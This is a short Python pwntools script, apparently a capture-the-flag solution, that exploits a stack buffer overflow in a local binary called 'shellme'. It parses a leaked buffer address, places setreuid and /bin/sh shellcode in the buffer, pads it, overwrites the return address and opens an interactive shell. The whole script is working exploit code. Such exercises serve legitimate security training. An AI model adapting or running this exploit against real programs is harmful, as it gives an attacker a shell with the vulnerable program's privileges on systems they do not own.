from pwn import *
import re
r = process('./shellme')
stdout  = r.recvuntil("\n")
stdout  = r.recvuntil("\n")
stdout = stdout.decode("ascii") 
a = stdout.find(':')+2
temp = stdout[a:]
b = temp.find(' ')
temp = temp[:b]
bufferaddr = int(temp,16)

context(os='linux',arch='amd64',log_level='debug')
shell = asm(shellcraft.setreuid()) + asm(shellcraft.amd64.linux.sh())

payload = shell + b'\x20'*72
print(len(payload))
payload = payload + p64(bufferaddr, endian = 'little')

r.sendline(payload) 
r.interactive()
